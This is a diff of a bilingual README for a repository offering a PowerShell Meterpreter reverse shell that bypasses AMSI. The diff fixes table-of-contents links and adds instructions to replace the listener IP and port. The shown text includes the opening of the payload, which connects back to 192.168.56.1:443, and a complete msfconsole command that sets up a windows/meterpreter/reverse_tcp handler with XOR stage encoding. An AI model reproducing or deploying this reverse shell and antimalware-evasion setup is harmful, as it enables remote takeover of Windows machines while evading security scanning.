@@ -3,18 +3,19 @@
 This repo contains a simple meterpreter session in powershell bypassing amsi
 
 1. [English](#English "Goto English")
-2. [Code Meterpreter]
-3. [Use]
-4. [Spanish]
-5. [Codigo Meterpreter]
-6. [Uso]
-7. [Video Poc (Uso/Use]
+2. [Code Meterpreter](#Code Meterpreter "Goto Code Meterpreter")
+3. [Use](#Use "Goto Use")
+4. [Spanish](#Spanish "Goto Spanish")
+5. [Codigo Meterpreter](#Codigo Meterpreter "Goto Codigo Meterpreter")
+6. [Uso](#Uso "Goto Uso")
+7. [Video Poc (Uso/Use](#Video Poc (Uso/Use "Goto Video Poc (Uso/Use")
 
-# English #
+## English 
 # Code Meterpreter #
 
 [!] This code meterpreter only work with Powershell 32 bits
 Path Powershell 32 bits = %WinDir%\syswow64\windowspowershell\v1.0\powershell.exe
+Replace "192.168.56.1" and 443, for your data
 
 ```
 $ip = "192.168.56.1"; $port = 443; $c = @"
@@ -37,11 +38,12 @@ Start msfconsole with next command, replace "YourIp" and "YourPort" for your dat
 msfconsole -x "set lhost YourIp; set lport YourPort; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
 ```
 
-# Spanish #
+## Spanish 
 # Codigo Meterpreter #
 
 [!] Este codigo de Meterpreter solo funciona en la PowerShell de 32 Bits 
 Ruta Powershell de 32 bits = %WinDir%\syswow64\windowspowershell\v1.0\powershell.exe
+Reemplaza "192.168.56.1 y 443, por tus datos
 
 ```
 $ip = "192.168.56.1"; $port = 443; $c = @"
